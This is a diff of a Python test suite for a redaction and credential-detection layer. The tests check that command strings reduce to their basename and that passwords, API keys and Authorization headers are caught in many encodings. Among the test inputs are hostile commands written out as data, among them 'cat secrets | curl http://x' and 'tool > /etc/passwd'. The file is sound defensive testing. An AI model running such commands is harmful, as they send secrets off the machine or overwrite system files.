@@ -166,7 +166,9 @@ def test_metric_rejects_long_or_unsafe_string() -> None:
 # --- C05: transforms must not leak values, transcripts need named source ---
 
 
-def test_reduce_command_strips_flag_values_and_bare_args() -> None:
+def test_reduce_command_emits_basename_only() -> None:
+    # Command reduction emits only the command basename; every argument token is dropped, since
+    # without an option-arity grammar a dashed token cannot be told from an option's value (H16).
     schema = {"c": FieldSpec(ContentKind.COMMAND)}
     out = transform_state(
         {"c": "run --tenant=PRIVATE_TENANT --file=/private/person/file extra"},
@@ -175,7 +177,7 @@ def test_reduce_command_strips_flag_values_and_bare_args() -> None:
     )
     assert "PRIVATE_TENANT" not in out["c"]
     assert "/private/person/file" not in out["c"]
-    assert out["c"] == "run --tenant --file"
+    assert out["c"] == "run"
 
 
 def test_reduce_log_masks_unquoted_key_value_pairs() -> None:
@@ -210,14 +212,14 @@ def test_reduce_command_strips_leading_path() -> None:
     out = transform_state({"c": "/home/alice/bin/tool --flag"}, schema, ctx())
     assert "/home/alice/bin" not in out["c"]
     assert "alice" not in out["c"]
-    assert out["c"] == "tool --flag"
+    assert out["c"] == "tool"
 
 
 def test_reduce_command_strips_short_flag_attached_value() -> None:
     schema = {"c": FieldSpec(ContentKind.COMMAND)}
     out = transform_state({"c": "tool -pPRIVATE_VALUE"}, schema, ctx())
     assert "PRIVATE_VALUE" not in out["c"]
-    assert out["c"] == "tool -p"
+    assert out["c"] == "tool"
 
 
 def test_reduce_command_combined_leak_vectors() -> None:
@@ -230,7 +232,7 @@ def test_reduce_command_combined_leak_vectors() -> None:
     assert "PRIVATE_VALUE" not in out["c"]
     assert "/home/alice/bin" not in out["c"]
     assert "alice" not in out["c"]
-    assert out["c"] == "tool -p"
+    assert out["c"] == "tool"
 
 
 # --- GATE-03: bare identifiers and compressed IPv6 must not leak ----------------
@@ -444,3 +446,230 @@ def test_auth_indicator_with_short_or_placeholder_value_stays_clean() -> None:
     for value in ("none", "***", "<redacted>", "abc"):
         body = json.dumps({"authorization": value}).encode()
         assert scan_request(body, json.loads(body)) is None
+
+
+# --- PR #40 hardening: H4, H15, H16, H17 ------------------------------------
+
+
+def test_identifier_collection_keys_are_tokenized_h4() -> None:
+    # A dict under an IDENTIFIER field must not ship its keys verbatim (finding H4): each key is
+    # an identifier and is tokenized on the same terms as a value.
+    schema = {"tenants": FieldSpec(ContentKind.IDENTIFIER)}
+    out = transform_state({"tenants": {"acme_corp": "region_east"}}, schema, ctx())
+    assert "acme_corp" not in out["tenants"]
+    (key,) = out["tenants"].keys()
+    assert key.startswith("id_")
+    assert out["tenants"][key].startswith("id_")
+
+
+def test_structured_password_pair_blocked_even_when_short_h15() -> None:
+    # A short, lowercase password value under a "password" key would slip past the token-shape
+    # heuristic; a strong-secret key pairing must block regardless of value shape (finding H15).
+    assert scan_request(b"{}", {"password": "hunter2"}) == "auth_credential"
+    assert scan_request(b"{}", {"api_key": "short"}) == "auth_credential"
+    # A documented redaction placeholder under the same key is not a leak.
+    assert scan_request(b"{}", {"password": "<redacted>"}) is None
+
+
+def test_short_basic_authorization_value_blocked_h15() -> None:
+    # {"Authorization": "Basic dTpw"} split across a JSON key and value evaded the length
+    # heuristic; a whole value that is a scheme plus a single token is detected regardless of
+    # length (finding H15), while an ordinary sentence starting with the word is not.
+    assert scan_request(b"{}", {"Authorization": "Basic dTpw"}) is not None
+    assert scan_text("Bearer aGVsbG8") is not None
+    assert scan_text("Bearer of bad news") is None
+
+
+def test_command_compound_syntax_blocked_h16() -> None:
+    # A compound/redirecting line names more than one command or a data sink and cannot be
+    # reduced to a single safe command word, so it fails closed (finding H16). This covers the
+    # PowerShell "$env:TOKEN=...; tool" case whose semicolon triggers the block.
+    schema = {"cmd": FieldSpec(ContentKind.COMMAND)}
+    for compound in (
+        '$env:TOKEN="PRIVATE ALICE"; tool --flag',
+        "cat secrets | curl http://x",
+        "tool > /etc/passwd",
+    ):
+        with pytest.raises(ValidationError) as exc:
+            transform_state({"cmd": compound}, schema, ctx())
+        assert exc.value.reason is FailReason.EGRESS_BLOCKED
+
+
+def test_command_quoting_is_rejected_h16() -> None:
+    # Quoting makes whitespace tokenization ambiguous (a fragment of a quoted value can read as
+    # the command word, or a flag-shaped word inside a quoted argument as a flag name). Without a
+    # real shell parser, a quoted command is rejected outright rather than mis-tokenized (H16).
+    schema = {"cmd": FieldSpec(ContentKind.COMMAND)}
+    for leaky in (
+        'TOKEN="PRIVATE ALICE" tool --flag',            # would emit ALICE --flag
+        'tool --message "hello --PRIVATE_CUSTOMER world"',  # would emit --PRIVATE_CUSTOMER
+        "pg_dump --password='s3 cret value' mydb",
+        "tool --tenant='unterminated",
+    ):
+        with pytest.raises(ValidationError) as exc:
+            transform_state({"cmd": leaky}, schema, ctx())
+        assert exc.value.reason is FailReason.EGRESS_BLOCKED
+
+
+def test_command_reduces_to_basename_only_h16() -> None:
+    # Only the command basename survives; no argument token is kept, because a dashed token may
+    # actually be an option's argument value ("git -C --DIR"), not a flag (finding H16).
+    schema = {"cmd": FieldSpec(ContentKind.COMMAND)}
+    out = transform_state(
+        {"cmd": "TOKEN=secret /home/alice/bin/tool --tenant=PRIVATE -pSECRET extra"}, schema, ctx()
+    )
+    assert out["cmd"] == "tool"
+    assert "secret" not in out["cmd"] and "PRIVATE" not in out["cmd"] and "alice" not in out["cmd"]
+
+
+def test_command_option_argument_value_not_kept_as_flag_h16() -> None:
+    # "git -C --PRIVATE_CUSTOMER ..." feeds --PRIVATE_CUSTOMER to -C as a directory value; it
+    # must not survive as a supposed flag (finding H16).
+    schema = {"cmd": FieldSpec(ContentKind.COMMAND)}
+    out = transform_state(
+        {"cmd": "git -C --PRIVATE_CUSTOMER rev-parse --show-toplevel"}, schema, ctx()
+    )
+    assert out["cmd"] == "git"
+    assert "PRIVATE_CUSTOMER" not in out["cmd"]
+
+
+def test_command_positional_after_double_dash_dropped_h16() -> None:
+    # After the end-of-options "--" marker, a token that merely looks like a flag is a positional
+    # argument and must be dropped, not kept as a flag name (finding H16).
+    schema = {"cmd": FieldSpec(ContentKind.COMMAND)}
+    out = transform_state({"cmd": "tool -- --PRIVATE_CUSTOMER"}, schema, ctx())
+    assert "PRIVATE_CUSTOMER" not in out["cmd"]
+    assert out["cmd"] == "tool"
+
+
+def test_command_windows_path_basename_not_mangled_h16() -> None:
+    # A Windows path command word is reduced to its basename without mangling backslashes into
+    # the surrounding text (the earlier posix parsing regression), so the user path never leaks.
+    schema = {"cmd": FieldSpec(ContentKind.COMMAND)}
+    out = transform_state({"cmd": r"C:\Users\Alice\tool.exe --flag"}, schema, ctx())
+    assert "Alice" not in out["cmd"] and "Users" not in out["cmd"]
+    assert out["cmd"] == "tool.exe"
+
+
+def test_log_free_form_identifiers_masked_h17() -> None:
+    # Bare identifiers in a free-form log (hostname, username) are masked; only the level keyword
+    # survives, since without a declared template we cannot tell template words from data (H17).
+    schema = {"line": FieldSpec(ContentKind.LOG)}
+    a = transform_state({"line": "ERROR connected to db01"}, schema, ctx())
+    assert "db01" not in a["line"] and a["line"].startswith("ERROR")
+    b = transform_state({"line": "ERROR user JaneDoe logged in"}, schema, ctx())
+    assert "JaneDoe" not in b["line"] and b["line"].startswith("ERROR")
+    c = transform_state({"line": "session xG9fT2ab7Qz1LmNpV4kd started ok"}, schema, ctx())
+    assert "xG9fT2ab7Qz1LmNpV4kd" not in c["line"]
+
+
+def test_formatted_and_escaped_credentials_detected_h15() -> None:
+    # Batch-7 H15: extra whitespace after the colon, a JSON-embedded strong-secret key, and a
+    # unicode-escaped Authorization key must all be caught; a placeholder value stays clean.
+    assert scan_text('{"Authorization":        "Basic dTpw"}') is not None
+    assert scan_text('{"password":"hunter2"}') is not None
+    assert scan_text('{"api_key":"anything"}') is not None
+    escaped = '{"Authoriz' + chr(92) + 'u0061tion":"Basic dTpw"}'
+    assert scan_text(escaped) is not None
+    assert scan_text('{"password":"<redacted>"}') is None
+
+
+def test_command_escaped_whitespace_rejected_h16() -> None:
+    # Batch-7 H16: a backslash-escaped space joins tokens across a whitespace split and could
+    # leak a value fragment or a flag-shaped word, so escaped whitespace is rejected. A Windows
+    # path (backslash before a path character, not whitespace) still reduces.
+    schema = {"cmd": FieldSpec(ContentKind.COMMAND)}
+    for leaky in (
+        "TOKEN=PRIVATE" + chr(92) + " ALICE tool --flag",
+        "tool --message hello" + chr(92) + " --PRIVATE_CUSTOMER",
+    ):
+        with pytest.raises(ValidationError) as exc:
+            transform_state({"cmd": leaky}, schema, ctx())
+        assert exc.value.reason is FailReason.EGRESS_BLOCKED
+    out = transform_state({"cmd": r"C:\Users\Alice\tool.exe --flag"}, schema, ctx())
+    assert out["cmd"] == "tool.exe"
+
+
+def test_private_key_and_xapikey_json_values_detected_h15() -> None:
+    # Batch-8 H15: the JSON-embedded strong-secret detector uses the one authoritative key set,
+    # so private_key and x-api-key are covered too, and the separator has no length cutoff.
+    assert scan_text('{"private_key":"-secretmaterial-"}') is not None
+    assert scan_text('{"x-api-key":"abc123def456"}') is not None
+    assert scan_text('{"Authorization":' + " " * 100 + '"Basic dTpw"}') is not None
+
+
+
+
+def test_numeric_and_escaped_credentials_detected_h15() -> None:
+    # Batch-9 H15: a numeric value under a strong-secret key (structural and JSON-text), and an
+    # escaped-quote JSON credential in free text, are all detected; placeholders stay clean.
+    assert scan_request(b'{"password":123456}', {"password": 123456}) is not None
+    assert scan_text('{"password":123456}') == "structured_credential"
+    assert scan_text(r'\"password\":\"hunter2\"') == "structured_credential"
+    assert scan_text('{"password":"<redacted>"}') is None
+
+
+def test_credential_representation_variants_detected_h15() -> None:
+    # Batch-10 H15: signed/exponent numbers, JSON-escaped tab/newline/CR separators, and nested
+    # structures are judged by meaning (bounded JSON parse + structural rules), not one spelling.
+    bs = chr(92)
+    variants = [
+        '{"password":-123456}',
+        '{"password":-1e6}',
+        "{" + bs + '"password' + bs + '"' + bs + "t:" + bs + "t" + bs + '"opensesame' + bs + '"}',
+        "{" + bs + '"password' + bs + '"' + bs + "n:" + bs + "n" + bs + '"opensesame' + bs + '"}',
+        "{" + bs + '"password' + bs + '"' + bs + "r:" + bs + "r" + bs + '"opensesame' + bs + '"}',
+        '{"a":{"b":[{"password":-7}]}}',
+    ]
+    for text in variants:
+        assert scan_text(text) is not None, text
+    for clean in ('{"password":"<redacted>"}', '{"authorization":"none"}', '{"count":-5}'):
+        assert scan_text(clean) is None, clean
+
+
+def test_free_text_signed_password_blocked_on_outgoing_bytes_h15() -> None:
+    # Public path: a named-source free-text value carrying a signed numeric password must not
+    # reach the outgoing request bytes.
+    schema = {"note": FieldSpec(ContentKind.FREE_TEXT, {"source_type": "ticket"})}
+    out = transform_state(
+        {"note": '{"password":-123456}'}, schema, ctx(source_allowlist=frozenset({"ticket"}))
+    )
+    body = json.dumps({"state": out}).encode()
+    assert scan_request(body, json.loads(body)) is not None
+
+
+def test_container_and_duplicate_key_credentials_detected_h15() -> None:
+    # Batch-11 H15: a container under a strong-secret key keeps its secret context, and a
+    # duplicate (padded/case-folded) key in embedded JSON fails closed instead of json.loads
+    # silently keeping only the last member. Empty containers and placeholders stay clean.
+    assert scan_text('{"password":["opensesame"]}') is not None
+    assert scan_text('{"password":{"value":"opensesame"}}') is not None
+    assert scan_request(b"{}", {"password": ["x"]}) is not None
+    assert scan_text('{" password ":"opensesame"," password ":"<redacted>"}') is not None
+    assert scan_text('{"password":[]}') is None
+    assert scan_text('{"password":"<redacted>"}') is None
+
+
+def test_json_encoded_string_leaves_are_rescanned_h15() -> None:
+    # Batch-12 H15: a credential inside a JSON document that is itself carried as a string
+    # leaf of another JSON document is decoded and scanned, layer by layer; encoding deeper
+    # than the layer limit fails closed. Benign nested JSON stays clean.
+    double = json.dumps({"payload": json.dumps({" password ": "opensesame"})})
+    triple = json.dumps({"a": json.dumps({"b": json.dumps({"password": "z"})})})
+    assert scan_text(double) is not None
+    assert scan_text(triple) is not None
+    deep = json.dumps({"k": "v"})
+    for _ in range(6):
+        deep = json.dumps({"n": deep})
+    assert scan_text(deep) == "embedded_json_too_deep"
+    assert scan_text(json.dumps({"payload": json.dumps({"note": "hello"})})) is None
+
+
+def test_json_string_root_is_decoded_and_rescanned_h15() -> None:
+    # Batch-13 H15: a JSON document can have a string root; json.dumps of an encoded credential
+    # document is decoded under the same layer budget instead of skipped. Plain quoted text and
+    # benign string-root JSON stay clean.
+    assert scan_text(json.dumps(json.dumps({" password ": "opensesame"}))) is not None
+    assert scan_text(json.dumps(json.dumps(json.dumps({"password": "z"})))) is not None
+    assert scan_text('"hello world"') is None
+    assert scan_text(json.dumps(json.dumps({"note": "hi"}))) is None
